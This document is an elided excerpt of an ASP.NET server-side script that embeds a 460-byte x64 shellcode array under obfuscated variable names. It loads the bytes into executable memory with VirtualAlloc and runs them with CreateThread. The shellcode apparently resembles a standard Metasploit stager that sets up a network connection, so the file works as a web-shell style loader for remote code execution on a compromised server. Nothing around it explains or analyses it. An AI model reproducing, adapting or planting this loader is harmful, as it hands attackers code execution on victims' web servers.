...
<script runat="server">
    ...
    {
        byte[] cQbwLJqHuEQ = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,
...
0x23,0x2b,0x0a,0x11,0x00,0xb3,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,
...
0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5};
        ...
        IntPtr tVs0TlGJr = VirtualAlloc(IntPtr.Zero,(UIntPtr)cQbwLJqHuEQ.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(cQbwLJqHuEQ,0,tVs0TlGJr,cQbwLJqHuEQ.Length);
        IntPtr fSHCm6oLJGb = IntPtr.Zero;
        IntPtr z2kcX = CreateThread(IntPtr.Zero,UIntPtr.Zero,tVs0TlGJr,IntPtr.Zero,0,ref fSHCm6oLJGb);
    }
</script>
